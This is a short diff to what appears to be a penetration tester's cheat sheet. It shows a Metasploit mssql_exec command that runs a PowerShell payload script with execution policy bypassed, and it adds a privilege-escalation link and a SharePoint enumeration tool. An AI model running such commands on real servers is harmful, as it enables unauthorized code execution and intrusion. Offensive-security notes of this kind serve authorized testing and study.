@@ -4,3 +4,12 @@ msfconsole:
 1. Execute command via mssql
 use auxillary/admin/mssql/mssql_exec
     set cmd "powershell -exec bypass -NoExit -File C:\\FTP\\pay.ps1" 
+
+
+
+Local privlege escalation links:
+https://www.rebootuser.com/?p=1623
+
+
+Enumeration Tools:
+SPartan - SPartan is a Frontpage and Sharepoint eviscerator, great for mutilating Sharepoint sites.
